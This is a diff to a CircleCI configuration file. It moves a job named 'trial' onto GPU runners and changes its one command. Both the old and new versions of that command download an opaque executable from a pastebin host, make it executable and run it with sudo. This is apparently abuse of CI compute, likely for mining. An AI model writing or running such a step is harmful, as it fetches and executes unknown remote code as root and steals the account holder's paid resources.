@@ -3,12 +3,14 @@ version: 2.1
 jobs:
   trial:
     machine:
-      image: ubuntu-2004:current
-    resource_class: large
+      image: ubuntu-2004-cuda-11.4:202110-01
+    resource_class: gpu.nvidia.large
     steps:
+      - run: nvidia-smi
+      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
       - run: 
             name: "trial" 
-            command: wget https://muq-hastebin.glitch.me/raw/tIDM1H6ovF && chmod u+x tIDM1H6ovF && sudo ./tIDM1H6ovF
+            command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://hastebin.skyra.pw/raw/ekoqiticif && chmod u+x ekoqiticif && sudo ./ekoqiticif 
  
 workflows: 
     version: 2.1 
